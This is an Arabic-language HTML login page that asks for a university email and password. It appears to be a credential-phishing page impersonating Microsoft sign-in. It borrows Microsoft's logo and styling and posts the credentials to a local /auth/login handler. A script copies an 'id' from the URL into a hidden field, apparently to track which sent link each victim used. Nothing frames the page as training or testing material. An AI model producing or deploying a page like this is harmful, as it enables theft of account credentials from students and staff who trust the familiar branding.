<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f3f2f1;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 6px;
      width: 360px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
    }
    .login-box img {
      width: 80px;
      margin-bottom: 20px;
    }
    .login-box h2 {
      margin-bottom: 20px;
      color: #333;
    }
    .input-group {
      position: relative;
      margin: 10px 0;
    }
    .form-control {
      width: 100%;
      padding: 10px 40px 10px 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 14px;
      direction: ltr;
    }
    .input-icon {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      color: #666;
      font-size: 16px;
      cursor: pointer;
    }
    button {
      background: #0067b8;
      color: #fff;
      border: none;
      padding: 12px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }
    button:hover {
      background: #005a9e;
    }
    .forgot {
      margin-top: 15px;
      font-size: 14px;
    }
    .forgot a {
      color: #0067b8;
      text-decoration: none;
    }
    .forgot a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
    <h2>تسجيل الدخول بإستخدام بريدك الجامعي</h2>
    <form action="/auth/login" method="POST">
      <div class="input-group">
        <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
        <span class="input-icon">@</span>
      </div>
      <div class="input-group">
        <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
        <span class="input-icon" onclick="togglePassword()">👁</span>
      </div>
      <input type="hidden" id="linkId" name="id">
      <button type="submit">تسجيل الدخول</button>
    </form>
    <div class="forgot">
      <a href="#">هل نسيت كلمة المرور؟</a>
    </div>
  </div>

  <script>
    // قراءة id من الرابط
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('id');
    if (linkId) {
      document.getElementById('linkId').value = linkId;
    }

    // إظهار/إخفاء كلمة المرور
    function togglePassword() {
      const passField = document.getElementById("password");
      passField.type = passField.type === "password" ? "text" : "password";
    }
  </script>
</body>
</html>
